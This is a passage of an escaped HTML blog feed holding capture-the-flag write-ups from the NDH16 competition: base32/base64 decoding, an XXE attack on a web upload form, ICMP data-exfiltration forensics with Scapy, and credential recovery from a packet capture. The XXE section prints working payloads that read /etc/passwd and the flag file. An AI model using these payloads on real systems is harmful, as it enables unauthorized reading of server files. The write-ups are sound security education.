&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apr&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux2&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;4D4A5756[...]4F493D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'MJWVE32NKRNGMZJTORVU46THPBHDESTIJUZFS6KZGJMTETKXLE2U4MSVGNGXUQLZJUZEU3KPIRCTCWSXJJWU6V2GNRGW2RTKJVVFU222IRGXOWLNJU2E2RCSNBHG2SJRJZCFSMC2I5LGYTSENM2E6V2ONJNFIUL2JVLVS6CONJEXQWSXKE2U6RCKNVNEIULYLJWUKNCNIRAXOTTNJU2E6V2SNJMXURJTLJKFK6SZKRIXOT2ELJUFU3KKNJMVOSL2LEZEU2SPI5ITGTT2JUZU2VCKNRHFIZZSJUZTCOI='&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great! We have another base-encoded message! I’ll skip the determination process for this one, we’re dealing with &lt;strong&gt;base32&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MJWVE32NKR[...]ZSJUZTCOI=&quot;&lt;/span&gt; | base32 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
bmRoMTZfe3tkNzgxN2JhM2YyY2Y2MWY5N2U3MzAyM2JmODE1ZWJmOWFlMmFjMjZkZDMwYmM4MDRhNmI1NDY0ZGVlNDk4OWNjZTQzMWYxNjIxZWQ5ODJmZDQxZmE4MDAwNmM4OWRjYzE3ZTUzYTQwODZhZmJjYWIzY2JjOGQ3NzM3MTJlNTg2M319
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One more! Let me guess, &lt;strong&gt;base64&lt;/strong&gt; this time?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bmRoMTZf[...]NTg2M319&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
ndh16_&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;d7817ba3f2cf61f97e73023bf815ebf9ae2ac26dd30bc804a6b5464dee4989cce431f1621ed982fd41fa80006c89dcc17e53a4086afbcab3cbc8d773712e5863&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alright, this was the final step! Congratz’ :triangular_flag_on_post:&lt;/p&gt;

&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.</summary></entry><entry><title type="html">XML External Entities: Wonkachall-step1 - NDH16</title><link href="http://localhost:4000/web/2018/07/03/Wonka-chall-step1-NDH16.html" rel="alternate" type="text/html" title="XML External Entities: Wonkachall-step1 - NDH16" /><published>2018-07-03T22:00:00+02:00</published><updated>2018-07-03T22:00:00+02:00</updated><id>http://localhost:4000/web/2018/07/03/Wonka-chall-step1-NDH16</id><content type="html" xml:base="http://localhost:4000/web/2018/07/03/Wonka-chall-step1-NDH16.html">&lt;p&gt;This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;We have &lt;a href=&quot;http://willywonka.shop:4242/&quot;&gt;a website&lt;/a&gt; which is actually The Golden Ticket Blackmarket platform. It proposes a list of purchasable golden tickets where each ticket has a bitcoin cost, a name and an address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/tickets.png&quot; alt=&quot;Wonka Shop screen capture&quot; title=&quot;Willy Wonka Shop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The challenge statement says that the flag is stored in ““/flags.txt”. The objective is to take control of this website. Hurry up!&lt;/p&gt;

&lt;h2 id=&quot;take-my-golden-ticket&quot;&gt;Take my Golden Ticket!&lt;/h2&gt;

&lt;p&gt;The first reflex to have when you arrive on a website should be to hit “CTRL+U” and dive deep into the source code.
The vast majority of this website is static at the exception of the “/upload.php” page. We are able to upload a zip archive containing a &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; and a &lt;strong&gt;Ticket&lt;/strong&gt; as shown in the provided example.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/upload.png&quot; alt=&quot;Upload page screen capture&quot; title=&quot;Upload page&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;Ticket file&lt;/strong&gt; contains a string representing the content of the Golden Ticket and the &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; stores the three variables displayed on the home page for each ticket, as shown below:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Wait a second… it means that the server is parsing XML files in order to get these values… Very interesting! :smiling_imp:&lt;/p&gt;

&lt;p&gt;Have you ever heard of XML external entities?&lt;/p&gt;

&lt;h2 id=&quot;thats-not-a-ticket&quot;&gt;That’s not a Ticket&lt;/h2&gt;

&lt;p&gt;XML External Entity Processing attack aim at exploiting &lt;strong&gt;weakly configured XML parsers&lt;/strong&gt;. The objective is to reference external entities inside the XML document in order to &lt;strong&gt;access local resources&lt;/strong&gt; or to &lt;strong&gt;execute code remotely&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Alright, now let’s modify our MANIFEST.xml to detect if the website is vulnerable. I suggest the following payload, supposed to include “/etc/passwd” and to display it in place of the ticket’s address:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we zip the MANIFEST and the Ticket, we upload it and… :tada:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/etcpasswd.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;/etc/passwd&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Say Hello to the list of users!&lt;/p&gt;

&lt;p&gt;Fine, now we can forge the payload that will allow us to retrieve the flag located under “/flag.txt”. This is basically the same payload as before in which we replace the target file as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here comes the reward! :triangular_flag_on_post:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/flag.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;Flag&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can now read the writeup of Wonkachall-step2 :wink:&lt;/p&gt;

&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.</summary></entry><entry><title type="html">Data exfiltration with PING: ICMP - NDH16</title><link href="http://localhost:4000/forensic/2018/07/02/Data-exfiltration-with-PING-ICMP-NDH16.html" rel="alternate" type="text/html" title="Data exfiltration with PING: ICMP - NDH16" /><published>2018-07-02T22:00:00+02:00</published><updated>2018-07-02T22:00:00+02:00</updated><id>http://localhost:4000/forensic/2018/07/02/Data-exfiltration-with-PING-ICMP-NDH16</id><content type="html" xml:base="http://localhost:4000/forensic/2018/07/02/Data-exfiltration-with-PING-ICMP-NDH16.html">&lt;p&gt;An interesting forensic challenge covering a famous method of data exfiltration… 
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;We are given &lt;a href=&quot;http://localhost:4000/assets/2018-07-02/analysis.pcap&quot;&gt;a packet capture&lt;/a&gt; showing lots of &lt;strong&gt;Echo Requests / Replies&lt;/strong&gt; between the same two computers and we’re supposed to investigate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-02/wireshark.png&quot; alt=&quot;Wireshark screen capture&quot; title=&quot;Wireshark&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pretty-heavy-for-a-ping&quot;&gt;Pretty heavy for a ping…&lt;/h2&gt;

&lt;p&gt;The ICMP protocol is pretty simple and does not contain a lot of information. However, it includes a &lt;strong&gt;data field&lt;/strong&gt; used notably in error messages. This data field can also be used for creating an &lt;strong&gt;ICMP tunnel&lt;/strong&gt; between two remote computers where hosts inject data into icmp echo packets. This method is often used to &lt;strong&gt;bypass firewall rules&lt;/strong&gt; in the aim of &lt;strong&gt;exfiltrating data&lt;/strong&gt;.
Such process can be detected by analyzing ICMP echo packets’ size. These packets usually don’t exceed 100 bytes. Here, each of them is 542 bytes long.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-02/icmp_packet_size.png&quot; alt=&quot;ICMP packet size&quot; title=&quot;ICMP Packet size&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We definitively should have a look at what takes so much space.&lt;/p&gt;

&lt;h2 id=&quot;gimme-your-data&quot;&gt;Gimme your data!&lt;/h2&gt;

&lt;p&gt;I wrote a simple python script &lt;strong&gt;extracting the data section&lt;/strong&gt; of ICMP echo request packets. For this, I used the &lt;strong&gt;Scapy&lt;/strong&gt; module, which is for me the best tool when it comes to handling packet captures, due to its effectiveness and simplicity of use. My script also &lt;strong&gt;converts extracted data to ASCII&lt;/strong&gt; because it occured to be base64 encoded, which is not surprising since it avoids encoding errors during the transmission.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdpcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'analysis.pcap'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Echo request&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;NOTE: I only kept request packets since replies send back same data and can cause errors when recovering exfiltrated data.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The hidden text reveals to be a part of the very famous &lt;em&gt;“Hacker Manifesto”&lt;/em&gt; followed by the man page of the “ping” tool.
Right between the two texts lies our reward… :triangular_flag_on_post:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I am a hacker, and this is my manifesto.  You may stop this individual,
but you can't stop us all... after all, we're all alike.

                              +++The Mentor+++


Congratulations, ICMP exfiltatration is awesome! The flag is : ndh2k18_017395f4c6312759



Now let's read the manual of one of the best tools you never had!

PING(8)                                  System Manager's Manual: iputils                                  PING(8)

NAME
      ping - send ICMP ECHO_REQUEST to network hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">An interesting forensic challenge covering a famous method of data exfiltration…</summary></entry><entry><title type="html">PCAPNG Forensics: Decode - NDH16</title><link href="http://localhost:4000/forensic/2018/07/01/PCAPNG-Forensics-NDH-Decode.html" rel="alternate" type="text/html" title="PCAPNG Forensics: Decode - NDH16" /><published>2018-07-01T18:00:00+02:00</published><updated>2018-07-01T18:00:00+02:00</updated><id>http://localhost:4000/forensic/2018/07/01/PCAPNG-Forensics-NDH-Decode</id><content type="html" xml:base="http://localhost:4000/forensic/2018/07/01/PCAPNG-Forensics-NDH-Decode.html">&lt;p&gt;A warm-up forensic challenge proposed by NDH16…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
&lt;p&gt;We are given &lt;a href=&quot;/assets/2018-07-01/decode.pcapng&quot;&gt;a packet capture&lt;/a&gt; and &lt;a href=&quot;.assets/2018-07-01/Decode_.zip&quot;&gt;a zip archive&lt;/a&gt; which have to be investigated.&lt;/p&gt;

&lt;h2 id=&quot;wiresharks-power&quot;&gt;Wireshark’s power&lt;/h2&gt;
&lt;p&gt;Let’s open this packet capture with Wireshark, it’s simply one of the best and easiest-to-use tool for analyzing network captures.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-01/wireshark.png&quot; alt=&quot;Wireshark screen capture&quot; title=&quot;Wireshark&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each request is sent to localhost (127.0.0.1) so this capture probably shows interactions between the client and the local  in-development server.&lt;/p&gt;

&lt;p&gt;We can see that &lt;strong&gt;HTTP&lt;/strong&gt; is used over &lt;strong&gt;TCP&lt;/strong&gt; so the best thing to do is to use the &lt;em&gt;“Follow HTTP stream”&lt;/em&gt; option in order to undesrtand the nature of the resquets shown here.&lt;/p&gt;

&lt;p&gt;The GET request at destination of &lt;strong&gt;/wp-login.php&lt;/strong&gt; indicates us that we are dealing with a &lt;strong&gt;wordpress&lt;/strong&gt; site. The next HTTP POST request seems very interesting because it should contain the authentication parameters of the website’s administrator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-01/httpstream.png&quot; alt=&quot;HTTP stream screen capture&quot; title=&quot;HTTP stream&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indeed, we see the following admin credentials in the request parameters.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;log=decode&amp;amp;pwd=95%2F%40Jywf5R%40666
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This password gives &lt;strong&gt;95/@Jywf5R@666&lt;/strong&gt; once URL-decoded.
However, the challenge is not over since we don’t have the flag yet…&lt;/p&gt;

&lt;h2 id=&quot;what-about-the-zip&quot;&gt;What about the zip?&lt;/h2&gt;

&lt;p&gt;When trying to unzip the given archive, we face the following error:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip Decode_.zip
Archive:  Decode_.zip
   skipping: Decode_/Decode0         need PK compat. v5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;can &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;v4.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   creating: Decode_/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It looks like we need another tool to extract the content of this zip. &lt;strong&gt;7z&lt;/strong&gt; should be fine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;7z e Decode_.zip

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,4 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-6200U CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;406E3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 366 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: Decode_.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Decode_.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 366


Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’re so lucky to have found a password in the pcapng capture! Let’s try it!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
Everything is Ok        

Folders: 1
Files: 1
Size:       442
Compressed: 366
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file “Decode0” is extracted. What does it contain?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Decode0
01101110 01100100 01101000 00110001 00110110 01011111 01100011 01100010 01100110 01100011 01100101 00110101 01100101 00110011 00110110 01100100 01100100 00110011 00110011 01100011 00110110 01100001 01100100 01100011 01100101 00110011 00110010 01100001 00110110 01100010 00110101 00110111 00110111 01100010 01100101 00110001 00110110 00110001 01100010 00111001 00111000 00110001 00110101 00111000 00111001 00110011 00100000 00100000 00101101
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This little one-liner removes spaces in the binary flow and convert it to ASCII:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~$ sed -e &quot;s/ //g&quot; &amp;lt; Decode0 |perl -lpe '$_=pack&quot;B*&quot;,$_'
ndh16_cbfce5e36dd33c6adce32a6b577be161b9815893  -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The job is done! :triangular_flag_on_post:&lt;/p&gt;

